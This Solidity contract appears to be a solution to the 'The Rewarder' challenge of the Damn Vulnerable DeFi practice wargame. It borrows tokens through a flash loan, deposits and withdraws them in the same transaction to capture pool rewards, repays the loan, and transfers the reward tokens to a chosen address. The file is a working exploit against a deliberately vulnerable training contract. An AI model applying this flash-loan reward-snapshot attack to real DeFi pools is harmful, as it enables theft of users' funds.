// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "@openzeppelin/contracts/utils/Address.sol";

import "../the-rewarder/FlashLoanerPool.sol";
import "../the-rewarder/TheRewarderPool.sol";
import "../the-rewarder/RewardToken.sol";
import "../DamnValuableToken.sol";

contract TheRewarderPoolAttack {

    address rewarderPoolAddress;
    address damnValuableTokenAddress;
    address flashPool;
    uint loadAmount;

    function run(
              address _attachAddress,
              address _rewardTokenAddress,
              address _flashPool,
              address _rewarderPoolAddress,
              address _damnValuableTokenAddress,
              uint _loadAmount)
              external
    {
        damnValuableTokenAddress = _damnValuableTokenAddress;
        rewarderPoolAddress = _rewarderPoolAddress;
        flashPool = _flashPool;
        loadAmount = _loadAmount;
        FlashLoanerPool(_flashPool).flashLoan(loadAmount);
        RewardToken(_rewardTokenAddress).transfer(_attachAddress,RewardToken(_rewardTokenAddress).balanceOf(address(this)));
    }

    function receiveFlashLoan(uint256 amount) external payable {
        DamnValuableToken(damnValuableTokenAddress).approve(rewarderPoolAddress, amount);
        TheRewarderPool(rewarderPoolAddress).deposit(amount);
        TheRewarderPool(rewarderPoolAddress).withdraw(amount);
        DamnValuableToken(damnValuableTokenAddress).transfer(flashPool,amount);
    }

    receive() external payable{}
    
}
 